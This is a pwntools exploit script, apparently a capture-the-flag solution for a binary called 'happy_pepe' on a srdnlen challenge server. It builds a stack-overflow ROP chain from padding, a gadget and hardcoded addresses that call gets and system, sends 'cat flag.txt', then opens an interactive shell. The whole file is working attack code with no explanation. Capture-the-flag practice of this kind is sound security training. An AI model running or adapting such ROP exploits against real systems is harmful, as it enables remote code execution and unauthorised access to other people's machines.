#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
exe = context.binary = ELF(args.EXE or './happy_pepe')

host = args.HOST or 'happypepe.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    # elif args.STRACE:
    #     return process(["strace", exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
set follow-fork-mode parent
br *0x401215
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

get = flat(0x4010C4)
system = flat(0x4010A4)
param = flat(0x404028)
gadget = flat(0x401216)
pad = b"A" * (48 + 16 + 8)

payload = flat(pad, gadget, param, get, gadget, param, system)

io.sendlineafter(b"> ", payload)

io.sendline(b"cat flag.txt")

payload = flat(gadget, param, system)
io.sendline(payload)

io.interactive()

